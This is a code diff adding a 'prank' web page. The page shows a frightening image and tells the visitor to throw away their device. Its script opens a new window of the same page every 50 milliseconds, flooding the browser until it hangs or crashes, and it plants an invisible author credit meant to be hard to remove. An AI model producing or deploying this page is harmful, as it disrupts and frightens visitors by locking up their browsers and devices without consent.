@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Prank</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #000;
+            background-size: cover;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px 4px #000;
+            margin-bottom: 20px;
+        }
+        footer {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 10px;
+            color: #fff;
+            font-size: 1em;
+            font-weight: bold;
+            letter-spacing: 2px;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+        /* Hidden credit that's difficult to find and edit */
+        .hidden-credit {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            font-size: 0.1px;
+            color: transparent;
+            pointer-events: none;
+            user-select: none;
+            z-index: -9999;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <h1>Dismantle your device and throw it away, it's useless</h1>
+    </div>
+    <script type="text/javascript">
+        // Array of scary background images
+        const backgroundImages = [
+            'https://i.ibb.co/2ZFCCdq/Screenshot-20240811-194139.png',
+            'https://i.ibb.co/8BxnF73/2024081020021048.png',
+            'https://i.ibb.co/dJ9Wk5h/Screenshot-20240810-142928.png',
+            'https://i.ibb.co/wSPYPk2/Jl-BMj1ut-SWa-ESNe-KO5-Wsz-Q.webp',
+            'https://i.ibb.co/bmS8yZ8/scary-awful-eye-gif-horror-halloween.gif'
+        ];
+
+        // Select a random background image
+        const randomImage = backgroundImages[Math.floor(Math.random() * backgroundImages.length)];
+        document.body.style.backgroundImage = `url(${randomImage})`;
+
+        function prank() {
+            window.open('/', '_blank');
+        }
+        setInterval(prank, 50);
+
+        // Obfuscated hidden credit
+        const hiddenDiv = document.createElement('div');
+        hiddenDiv.className = 'hidden-credit';
+        hiddenDiv.innerHTML = `Created by Rajnish (Kartoul) | <a href='https://www.youtube.com/channel/UCn0U0vU1QfNUky7Dz7E_SMg'>Click Here</a>`;
+        document.body.appendChild(hiddenDiv);
+    </script>
+    
+    <footer id="footer">
+        This is a prank created by Rajnish (Kartoul).
+    </footer>
+</body>
+</html>
